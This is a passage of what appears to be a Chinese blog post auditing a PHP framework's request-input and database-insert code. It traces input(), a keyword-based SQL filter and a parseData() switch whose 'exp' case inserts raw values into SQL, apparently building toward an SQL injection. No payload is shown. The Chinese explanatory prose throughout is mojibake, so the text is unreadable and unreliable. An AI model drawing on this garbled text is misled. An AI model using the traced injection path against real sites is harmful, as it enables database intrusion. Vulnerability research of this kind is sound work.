</span></span><span class="line"><span class="cl">        <span class="c1">// Ëß£ÊûêËøáÊª§Âô®
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$filter</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getFilter</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$default</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">array_walk_recursive</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="p">[</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;filterValue&#39;</span><span class="p">],</span> <span class="nv">$filter</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">reset</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filterValue</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$type</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$data</span> <span class="o">!==</span> <span class="nv">$default</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Âº∫Âà∂Á±ªÂûãËΩ¨Êç¢
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">typeCast</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$type</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÆÄÂçïËøáÁ®ãÔºå‰ªéÂâçÈù¢ÂèØ‰ª•ÁúãÂá∫Êù•Â∞±ÊòØ‰∏Ä‰∫õÂàÜÂâ≤Êìç‰ΩúÔºåÂú®ÂâçÈù¢ÂèÇÊï∞ÁöÑÂÆö‰πâ‰∏≠Ôºå<code>username/a</code>‰ª£Ë°®ÁöÑÂ∞±ÊòØÊé•Êî∂‰∏Ä‰∏™Êï∞ÁªÑÁ±ªÂûãÁöÑusernameÂèÇÊï∞ÔºåÁÆÄÂçïËØ¥‰∏Ä‰∏ãÂêéÈù¢ÁöÑÂàÜÂâ≤Êìç‰ΩúÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031028846.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303102802674"
	
	
></p>
<p>ÂâçÈù¢Êúâ‰∏Ä‰∏™Áî®<code>/</code>ÂàÜÂâ≤ÔºåËé∑ÂèñÂà∞‰∫ÜÂèÇÊï∞ÁöÑtypeÔºåÁÑ∂ÂêéËøôÈáåËé∑ÂèñÂà∞‰∫ÜÁî®<code>.</code>Êù•ÂàÜÂâ≤ÔºåÂÖ∂ÂÆûÈÄªËæëÂ∞±ÊòØËé∑ÂèñÂà∞usernameÁöÑÂÄºÔºåËøôÈáåÊòØfupancÔºåÊâÄ‰ª•‰ºöÂ∞Ü<code>$data</code>ÂÄºËÆæÁΩÆÊàê‰∫ÜfupancÔºåÂπ∂‰∏îËøô‰∏™ÂÄº‰∏çÊòØ‰∏Ä‰∏™ÂÆû‰æãÔºåÊâÄ‰ª•‰πü‰∏ç‰ºöËøõÂÖ•ÂêéÈù¢ÁöÑifÊù°‰ª∂„ÄÇ</p>
<p>ÁªßÁª≠ÂæÄÂêéÈù¢ÁúãÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031052489.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303105215442"
	
	
></p>
<p>ËøôÈáåË∞ÉÁî®‰∫ÜgetFilter()ÂáΩÊï∞ÔºåÂ∞±ÊòØ‰∏Ä‰∏™Ëé∑ÂèñËøáÊª§Âô®ÁöÑÊìç‰ΩúÔºå‰ΩÜÊòØÊàëËøôÈáåÂπ∂Ê≤°ÊúâÁâπÂà´ËÆæÁΩÆfilterÔºåÊâÄ‰ª•Â∞±ÊòØ‰∏∫Á©∫„ÄÇ</p>
<p>ÂÜçÂêéÈù¢ÔºåËøôÈáåÊàëÊòØÁõ¥Êé•‰º†ÂèÇÁöÑfupancÔºå‰∏çÊòØÊï∞ÁªÑÁ±ªÂûãÔºåÊâÄ‰ª•‰∏çhiËøõÂÖ•ÂêéÈù¢ÁöÑifËØ≠Âè•ÔºåËÄåÂú®elseËØ≠Âè•‰∏≠ÔºåÂèØ‰ª•ÁúãÂà∞ÁöÑË∞ÉÁî®‰∫ÜfilterValue()ÂáΩÊï∞Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031110558.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303111016512"
	
	
></p>
<p>Á±ªÁöÑ‰º†ÂèÇÂ¶Ç‰∏äÔºåÁÑ∂ÂêéË∞ÉÁî®‰∫Üarray_pop()ÂáΩÊï∞ÔºåÂ∞±ÊòØÂéªÊéâÊï∞ÁªÑÁöÑÊúÄÂêé‰∏Ä‰∏™ÂÖÉÁ¥†„ÄÇ‰ΩÜÊòØÂêéÈù¢ÁöÑ<code>is_callable</code>ÂáΩÊï∞ÊòØÊ≤°ÊúâÈÄöËøáÁöÑÔºåis_callable()ÂáΩÊï∞Â∞±ÊòØÂà§ÂÆöÊòØÂê¶ÂèØ‰ª•‰Ωú‰∏∫‰∏∫‰∏Ä‰∏™ÂáΩÊï∞Ë∞ÉÁî®ÔºåÂæàÊòæÁÑ∂ËøôÈáå‰∏çË°å„ÄÇËÄåis_scalar()ÂáΩÊï∞ÔºåÂ∞±ÊòØÊ£ÄÊµãÊòØÂê¶ÊòØ‰∏Ä‰∏™Ê†áÈáèÔºåÊ†áÈáèÂèòÈáèÊòØÊåáÈÇ£‰∫õÂåÖÂê´‰∫Ü integer„ÄÅfloat„ÄÅstring Êàñ boolean ÁöÑÂèòÈáèÔºåËÄå array„ÄÅobject Âíå resource Âàô‰∏çÊòØÊ†áÈáè„ÄÇËøôÈáåÁöÑ<code>is_scalar</code>ÂáΩÊï∞ËôΩÁÑ∂Êª°Ë∂≥‰∫ÜÔºå‰ΩÜÊòØÂêéÈù¢ÁöÑ<code>is_scalar</code>ÂáΩÊï∞ÈáåÈù¢ÂÆö‰πâÁöÑifÁ≠âËØ≠Âè•ÈÉΩÊòØ‰∏çÊª°Ë∂≥ÁöÑÔºåÊâÄ‰ª•ÊúÄÂêé‰ºöÁõ¥Êé•returnÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031134240.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303113423206"
	
	
></p>
<p>ÁÑ∂ÂêéÂ∞±‰ºöË∞ÉÁî®Âà∞filterExp()ÂáΩÊï∞Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">filterExp</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ËøáÊª§Êü•ËØ¢ÁâπÊÆäÂ≠óÁ¨¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// TODO ÂÖ∂‰ªñÂÆâÂÖ®ËøáÊª§
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÂ∞±ÊòØ‰∏Ä‰∏™sqlÊ≥®ÂÖ•ÁöÑÈò≤Âæ°Êú∫Âà∂ÔºåÂ§ßÂ∞èÂÜôÂåπÈÖçÊù•ÊûÑÂª∫wafÔºåÂ¶ÇÊûúÂåπÈÖçÂà∞‰∫ÜÂÜÖÂÆπÔºåÈÇ£‰πàÂ∞±‰ºöÁõ¥Êé•Â∞ÜvalueÂêéÈù¢Âä†‰∏Ä‰∏™Á©∫Ê†ºÔºå‰ΩÜÊòØÊú¨Âú∞ÊµãËØï‰∫Ü‰∏Ä‰∏ãÔºåËøô‰∏™ËøáÊª§ÂæóÊØîËæÉ‰∏ÄËà¨ÂëÄ„ÄÇ</p>
<p>ÊúÄÂêéË∞ÉÁî®ÂÆåfilterEXPÂíåfilterValueÂáΩÊï∞ËøáÂêéÂ∞±ÂõûÂà∞‰∫Üinput()ÂáΩÊï∞Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031224744.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303122421686"
	
	
></p>
<p>ÊúÄÂêéÊúâ‰∏Ä‰∏™Á±ªÂûãËΩ¨Êç¢ÔºåËøôÈáåÂæó<code>$type</code>ÂèòÈáèÂ∞±ÊòØÂú®ÂâçÈù¢<code>/</code>ÂàÜÂâ≤ÈÇ£ÈáåÂàÜÂâ≤Âá∫Êù•ÁöÑ„ÄÇÊúÄÂêéÔºåÁªèËøáÁ±ªÂûãËΩ¨Êç¢ÂêéÔºåËøôÈáåÂ∞±‰ºöÂ∞ÜdataÁöÑÂÄºÂèòÊàê‰∏Ä‰∏™Êï∞ÁªÑÂπ∂Â∞ÜÂÖ∂ËøîÂõûÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031226786.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303122633750"
	
	
></p>
<p>‰ΩÜÊòØÂ¶ÇÊûúÊàëÁõ¥Êé•‰º†ÂèÇÊó∂Â∞±ÊòØ‰∏Ä‰∏™Êï∞ÁªÑÂë¢ÔºüËøòÊòØÁÆÄÂçïÊîπ‰∏Ä‰∏ãÈÖçÁΩÆÂç≥ÂèØÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031229584.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303122938546"
	
	
></p>
<p>ÁÑ∂ÂêéÂÜçÊ¨°Ë∞ÉËØïÂç≥ÂèØÔºå‰∏çÂêåÁöÑÁÇπÂú®‰∫éÂú®Ë∞ÉÁî®input()ÊñπÊ≥ïÊó∂Ôºåis_arrayÂáΩÊï∞Âà§Êñ≠ÊàêÂäüÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031234865.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303123422828"
	
	
></p>
<p>ÁÑ∂Âêé‰ºöË∞ÉÁî®Âà∞array_walk_recursive()ÂáΩÊï∞ÔºåÂÖ∂ÂÆûÂ∞±ÊòØ‰ºöË∞ÉÁî®filterValue()ÂáΩÊï∞ÔºåÁÆÄÂçïË∑ü‰∫Ü‰∏Ä‰∏ã„ÄÇËøáÁ®ãÂÖ∂ÂÆû‰πüÊòØÂíåÂâçÈù¢Â∑Æ‰∏çÂ§öÁöÑÔºå‰∏Ä‰∏™Ê£ÄÊµãÂÄºÁöÑÊìç‰ΩúÔºåËøôÈáåÂ∞±‰∏çÂ§öËØ¥‰∫Ü„ÄÇÊúÄÂêéË∞ÉÁî®reset()ÂáΩÊï∞Êù•ËæìÂá∫Êï∞ÁªÑÁ¨¨‰∏Ä‰∏™ÂÄºÔºå‰πüÂ∞±ÊòØfupancÔºåÂπ∂‰∏îÂêéÈù¢ÁöÑÊìç‰Ωú‰πüÊòØÂ∑Æ‰∏çÂ§öÁöÑÔºåËøôÈáåÂ∞±‰∏çÂ§öËØ¥‰∫Ü„ÄÇ</p>
<p>ÁÑ∂ÂêéÂ∞±Âà∞‰∫ÜÊï∞ÊçÆÂ∫ìËøûÊé•ÂèäÊèíÂÖ•Êìç‰Ωú‰∫ÜÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">db</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">([</span><span class="s1">&#39;username&#39;</span><span class="o">=&gt;</span><span class="nv">$username</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë∑üËøõËøô‰∏™db()ÊñπÊ≥ïÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031253919.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303125329878"
	
	
></p>
<p>ËøôÈáåÊòØËøûÊé•Êï∞ÊçÆÂ∫ìÔºåÂπ∂‰∏îÊåáÂÆö‰∫ÜÊï∞ÊçÆË°®‰∏∫usersË°®Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503031254510.png"
	
	
	
	loading="lazy"
	
		alt="image-20250303125403478"
	
	
></p>
<p>ÁÑ∂ÂêéË∞ÉÁî®‰∫Üinsert()ÊñπÊ≥ïÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041824509.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304182410394"
	
	
></p>
<p>ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÊòØË∞ÉÁî®‰∫ÜparseExpress()ÊñπÊ≥ïÔºåË∑ü‰∫Ü‰∏Ä‰∏ãÔºåÈáåÈù¢Â∞±ÊòØÂØπoptionsËøô‰∏™ÂèòÈáèËøõË°å‰∫Ü‰∏Ä‰∏ãÂ°´ÂÖÖÊìç‰ΩúÔºåÂú®Ëøô‰∏™ÊñπÊ≥ï‰∏≠ÔºåÂÖàÊòØÂÆö‰πâ‰∫Ü‰∏Ä‰∏™<code>$options</code>ÂèòÈáèÔºåÊòØ‰∏Ä‰∏™Êï∞ÁªÑÁ±ªÂûãÔºåÁÑ∂ÂêéÂ∞±ÊòØÂæÄËøô‰∏™Êï∞ÁªÑÁ±ªÂûãÁöÑÂèòÈáèËøõË°å‰∏Ä‰∫õÂ°´ÂÖÖÔºåÈáåÈù¢ÊúâÂá†‰∏™ÊòØÂêéÈù¢Ë¶ÅÊèêÂà∞ÁöÑÁÇπÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041836145.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304183615100"
	
	
></p>
<p>ËøôÈáåÁöÑgettable()ÊñπÊ≥ïÂèØ‰ª•Ëé∑ÂèñÂà∞tableÁöÑÂêçÂ≠óÔºåÂú®ËøôÈáåÂ∞±ÊòØusersÔºåÂπ∂‰∏îÂ∞ÜdataÁöÑÈîÆËÆæÁΩÆ‰∏∫‰∫ÜÁ©∫Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041839357.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304183953320"
	
	
></p>
<p>ÁÑ∂ÂêéÂêéÈù¢Êúâ‰∏Ä‰∏™foreachÊìç‰ΩúÔºåÂ∞ÜÈîÆ‰∏∫fetch_sqlÁöÑÂÄºËÆæÁΩÆ‰∏∫‰∫ÜfalseÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041837560.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304183736524"
	
	
></p>
<p>ÁÑ∂ÂêéÂú®ËøôÊñπÊ≥ï‰πãÈó¥ÔºåÊòØËøõË°å‰∫ÜÂæàÂ§öÁöÑÂ°´ÂÖÖÔºåÊúÄÂêéÊòØËøîÂõû‰∫ÜËøô‰∏™<code>$option</code>ÂèòÈáè„ÄÇ</p>
<p>ÈÄÄÂá∫‰∫ÜparseExpress()ÊñπÊ≥ïÔºåÁÑ∂ÂêéË∞ÉÁî®‰∫Üarray_merrge()ÊñπÊ≥ïÔºåËøô‰∏™ÊòØ‰∏Ä‰∏™ÂêàÂπ∂Êï∞ÁªÑÁöÑÊìç‰ΩúÔºå‰ΩÜÊòØËøôÈáåÂπ∂Ê≤°ÊúâÂêàÂπ∂ÔºüÂ∞èÊÄ™ÔºådataÁöÑÂÄºËøòÊòØÊ≤°ÊúâÊîπÂèò„ÄÇ</p>
<p>ÁÑ∂ÂêéË∞ÉÁî®‰∫Üinsert()ÂáΩÊï∞ÔºåËøôÈáåÁöÑ‚ÄúÂèëËµ∑ËÄÖ‚ÄùÊòØbuilderÂèòÈáèÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041849234.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304184946192"
	
	
></p>
<p>Áúã‰∏Ä‰∏ãbuilderÂèòÈáèÁöÑÂÆö‰πâÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041854181.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304185414142"
	
	
></p>
<p>ÊòØÊï∞ÊçÆÂ∫ìBuilderÂØπË±°ÂÆû‰æãÔºåÂêåÊó∂Âú®ËøôÈáåÔºåÊàë‰ª¨ËøòÂèØ‰ª•ÁúãÂà∞‰∏Ä‰∏™Êï∞ÊçÆÂ∫ìConnectionÂØπË±°ÂÆû‰æã„ÄÇÁÆÄÂçïÂå∫Âà´Â∞±ÊòØÔºö</p>
<ul>
<li>
<p>ConnectionÂØπË±°ÂÆû‰æãÊòØË°®Á§∫Êï∞ÊçÆÂ∫ìÁöÑËøûÊé•ÂÆû‰æãÔºåÂèØ‰ª•ËøõË°å‰∏Ä‰∫õÁÆÄÂçïÁöÑSQLÊü•ËØ¢ÁöÑÂäüËÉΩÔºå‰ΩÜÊòØÈúÄË¶Å‰∏∫‰∏Ä‰∏™ÂÆåÊï¥ÁöÑËØ≠Âè•„ÄÇ</p>
</li>
<li>
<p>builderÂØπË±°ÂÆû‰æãÔºåÊòØ‰∏Ä‰∏™Êï∞ÊçÆÂ∫ìÁöÑÊü•ËØ¢ÊûÑÂª∫Âô®ÔºåÁî®‰∫éÂä®ÊÄÅÁîüÊàêÂ§çÊùÇÁöÑSQLËØ≠Âè•„ÄÇ</p>
</li>
</ul>
<p>ÁÑ∂ÂêéÂ∞±‰ºöË∞ÉÁî®Âà∞insert()ÊñπÊ≥ïÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041913606.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304191340561"
	
	
></p>
<p>ËøôÈáåË∞ÉÁî®‰∫Ü‰∏Ä‰∏™parseData()ÂáΩÊï∞ÔºåÊ≠§Êó∂ÁöÑÂèÇÊï∞‰º†ÈÄíÂ¶Ç‰∏ãÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041916883.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304191648846"
	
	
></p>
<p>Âú®Ëøô‰∏™ÂáΩÊï∞‰∏≠ÔºåÂú®switchÈÉ®ÂàÜÂøÖÈ°ªË¶ÅÂåπÈÖçÂà∞Ôºå‰∏çÁÑ∂‰ºöÁõ¥Êé•ÈÄÄÂá∫ÂØºËá¥‰∏çËÉΩÊâßË°åsqlÊâßË°åÊìç‰ΩúÔºåÈÉ®ÂàÜ‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_object</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">method_exists</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="s1">&#39;__toString&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// ÂØπË±°Êï∞ÊçÆÂÜôÂÖ•
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$val</span> <span class="o">=</span> <span class="nv">$val</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$fields</span><span class="p">,</span> <span class="k">true</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;strict&#39;</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">&#39;fields not exists:[&#39;</span> <span class="o">.</span> <span class="nv">$key</span> <span class="o">.</span> <span class="s1">&#39;]&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_null</span><span class="p">(</span><span class="nv">$val</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;NULL&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$val</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">switch</span> <span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;exp&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;inc&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;+&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;dec&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;-&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_scalar</span><span class="p">(</span><span class="nv">$val</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// ËøáÊª§ÈùûÊ†áÈáèÊï∞ÊçÆ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">===</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="s1">&#39;:&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="o">-&gt;</span><span class="na">isBind</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$key</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="o">-&gt;</span><span class="na">bind</span><span class="p">(</span><span class="s1">&#39;data__&#39;</span> <span class="o">.</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$val</span><span class="p">,</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$bind</span><span class="p">[</span><span class="nv">$key</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$bind</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">:</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;:data__&#39;</span> <span class="o">.</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
